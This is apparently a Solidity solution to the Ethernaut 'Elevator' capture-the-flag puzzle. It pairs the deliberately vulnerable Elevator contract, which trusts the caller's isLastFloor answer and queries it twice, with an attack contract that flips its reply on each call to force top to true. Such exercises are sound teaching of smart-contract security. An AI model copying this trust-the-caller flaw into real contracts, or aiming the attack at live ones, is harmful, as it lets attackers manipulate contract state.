// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint) external returns (bool);
}


contract Elevator {
    bool public top;
    uint public floor;

    function goTo(uint _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}

contract Atk_Elevator {
    bool public change = true;

    function isLastFloor(uint _floor) external returns (bool){
        change = !change;
        return change;
    }

    function atk(uint _floor, address target) public {
        Elevator(target).goTo(_floor);
    }
}
